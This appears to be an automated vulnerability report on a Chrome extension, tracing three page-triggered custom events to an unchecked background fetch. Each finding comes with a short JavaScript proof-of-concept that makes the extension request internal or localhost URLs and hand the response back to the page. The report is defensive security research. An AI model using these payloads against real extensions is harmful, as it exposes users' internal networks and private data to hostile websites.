# CoCo Analysis: kgfbcbfamdkgbolodgflnijidnmlfjdb

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3

---

## Sink 1: cs_window_eventListener_testEvent → fetch_resource_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kgfbcbfamdkgbolodgflnijidnmlfjdb/opgen_generated_files/cs_0.js
Line 467: window.addEventListener("testEvent", ...)
Line 469: event.detail → message → chrome.runtime.sendMessage(message)

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kgfbcbfamdkgbolodgflnijidnmlfjdb/opgen_generated_files/bg.js
Line 1124: message.url → fetch(url)
```

**Code:**
```javascript
// Content script - cs_0.js Line 467
window.addEventListener("testEvent", function(event) {
    var message = event.detail; // ← attacker-controlled via webpage
    chrome.runtime.sendMessage(message); // ← forward to background
}, false);

// Background - bg.js Line 1120
function callXMLRPC(message) {
    var url = message.url; // ← attacker-controlled URL
    var methodName = message.methodName;

    // Line 1106
    fetch(url) // ← SSRF: fetch to attacker-controlled URL
    .then(response => response.text())
    .then(responseToSend => {
        chrome.tabs.query({active: true, currentWindow: true}, function(tabs) {
            chrome.tabs.sendMessage(tabs[0].id, {
                isXMLHttpRequest: true,
                method: method,
                result: responseToSend // ← response sent back to page
            });
        })
        return true;
    })
    .catch(ex => console.error('Error', ex.message))
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM custom event dispatch

**Attack:**
```javascript
// Attacker webpage code
var event = new CustomEvent("testEvent", {
    detail: {
        url: "http://internal.corp/admin/secret",  // ← SSRF target
        methodName: "getData"
    }
});
window.dispatchEvent(event);

// Extension fetches the URL and sends response back to attacker
```

**Impact:** Server-Side Request Forgery (SSRF). Attacker can make the extension perform privileged cross-origin requests to ANY URL (including internal networks, localhost, file:// URLs) and receive the response. This bypasses CORS and same-origin policy, allowing access to internal resources, port scanning, and exfiltration of data from protected endpoints.

---

## Sink 2: cs_window_eventListener_callNativeMessage → fetch_resource_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kgfbcbfamdkgbolodgflnijidnmlfjdb/opgen_generated_files/cs_0.js
Line 475: window.addEventListener("callNativeMessage", ...)
Line 477: event.detail → message → chrome.runtime.sendMessage(message)

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kgfbcbfamdkgbolodgflnijidnmlfjdb/opgen_generated_files/bg.js
Line 1124: message.url → fetch(url)
```

**Code:**
```javascript
// Content script - cs_0.js Line 475
window.addEventListener("callNativeMessage", function(event) {
    var message = event.detail; // ← attacker-controlled
    chrome.runtime.sendMessage(message); // ← forward to background
}, false);

// Background - same fetch handler as Sink 1
// message.url → fetch(url)
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM custom event dispatch

**Attack:**
```javascript
var event = new CustomEvent("callNativeMessage", {
    detail: {
        url: "http://192.168.1.1/admin",  // ← Internal network SSRF
        methodName: "scan"
    }
});
window.dispatchEvent(event);
```

**Impact:** Same as Sink 1 - SSRF vulnerability allowing privileged cross-origin requests to attacker-controlled destinations with response exfiltration.

---

## Sink 3: cs_window_eventListener_getActualExtensionVersionsFromServer → fetch_resource_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kgfbcbfamdkgbolodgflnijidnmlfjdb/opgen_generated_files/cs_0.js
Line 559: window.addEventListener("getActualExtensionVersionsFromServer", ...)
Line 561: event.detail → message → chrome.runtime.sendMessage(message)

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kgfbcbfamdkgbolodgflnijidnmlfjdb/opgen_generated_files/bg.js
Line 1124: message.url → fetch(url)
```

**Code:**
```javascript
// Content script - cs_0.js Line 559
window.addEventListener("getActualExtensionVersionsFromServer", function(event) {
    var message = event.detail; // ← attacker-controlled
    chrome.runtime.sendMessage(message); // ← forward to background
}, false);

// Background - same fetch handler as Sink 1 and 2
// message.url → fetch(url)
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM custom event dispatch

**Attack:**
```javascript
var event = new CustomEvent("getActualExtensionVersionsFromServer", {
    detail: {
        url: "http://localhost:8080/metrics",  // ← Localhost SSRF
        methodName: "getVersion"
    }
});
window.dispatchEvent(event);
```

**Impact:** Same as Sink 1 and 2 - SSRF vulnerability allowing privileged cross-origin requests to attacker-controlled destinations with response exfiltration.
